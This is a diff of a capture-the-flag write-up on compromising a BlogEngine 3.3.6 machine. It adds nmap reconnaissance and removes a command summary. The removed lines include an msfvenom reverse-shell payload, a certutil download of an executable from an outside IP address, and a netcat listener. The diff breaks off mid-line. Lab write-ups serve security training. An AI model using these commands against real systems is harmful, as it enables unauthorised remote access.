@@ -5,6 +5,31 @@
 
 ---
 
+## Reconnaissance
+
+### 1. **Nmap Scan**
+
+We began by scanning the target machine using **Nmap** to identify open ports and services.
+
+```bash
+nmap -sC -sV -oN nmap_scan.txt <target_ip>
+```
+- `-sC`: Runs default scripts.
+- `-sV`: Version detection.
+- `-oN`: Outputs the results to a file (`nmap_scan.txt`).
+
+#### Results:
+- **Port 80**: HTTP service running (BlogEngine 3.3.6)
+- **Port 3389**: Remote Desktop Protocol (RDP)
+
+---
+### Gain Foothold
+##  This portion will be demonstrated on my YouTube channel 
+- ***Crafted Payload***
+- ***BurpSuite***
+
+---
+
 ## Exploitation Process
 
 ### 1. Exploitation of BlogEngine 3.3.6
@@ -86,33 +111,4 @@
 
 - **Root Flag**:
   - **Location**: `C:\Users\Administrator\Desktop\root.txt`
-  - **Content**: `redacted3eb3d78d3e72`
-
----
-
-## Commands Summary:
-
-- **Generate Reverse Shell**:
-  ```bash
-  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.162.140 LPORT=7777 -f exe > Message.exe
-  ```
-
-- **File Transfer**:
-  ```bash
-  certutil -urlcache -f http://10.23.26.19:80/Message.exe Message.exe
-  ```
-
-- **Netcat Listener**:
-  ```bash
-  nc -nvlp 7777
-  ```
-
-- **Retrieve Root Flag**:
-  ```bash
-  type C:\Users\Administrator\Desktop\root.txt
-  ```
-
----
-
-## Conclusion:
-The BlogEngine 3.3.6 vulnerability was exploited successfully, allowing file upload and reverse shell execution. Privilege escalation was achieved using a scheduled task, and the root flag was retrieved from the Administrator's desktop.
+  - **Content**: `redacted
